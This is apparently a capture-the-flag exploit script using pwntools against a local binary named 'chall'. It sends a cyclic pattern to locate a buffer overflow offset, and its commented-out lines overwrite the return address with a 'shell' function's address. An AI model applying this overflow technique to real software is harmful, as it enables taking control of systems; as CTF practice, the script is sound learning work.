from pwn import *
import pwnlib.util.packing as pack

elf = ELF("./chall")
context.binary = elf
context.log_level = "DEBUG"
context(terminal=["tmux","split-window", "-h"])
p = process('./chall')
gdb.attach(p)



a = cyclic(1000)
p.sendline(a)
# offset = cyclic_find('saaa')
# shell = pack.p64(elf.symbols['shell'])
# payload = offset*b'A' + shell
# p.sendline(payload)

# p.interactive()
